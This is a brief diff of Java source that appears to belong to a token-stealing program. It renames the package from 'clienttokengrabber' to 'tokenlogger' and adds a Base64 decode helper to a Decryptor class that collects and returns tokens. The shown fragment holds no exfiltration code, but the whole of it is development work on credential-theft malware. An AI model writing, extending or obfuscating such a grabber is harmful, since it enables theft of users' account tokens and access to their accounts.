@@ -1,4 +1,4 @@
-package clienttokengrabber.utils;
+package tokenlogger.utils;
 
 import java.io.BufferedReader;
 import java.io.FileReader;
@@ -115,5 +115,9 @@ public class Decryptor {
         } catch (Exception ignored) {}
 
         return tokens;
+    }
+
+    public static String decode(String string) {
+        return new String(Base64.getDecoder().decode(string));
     }
 }
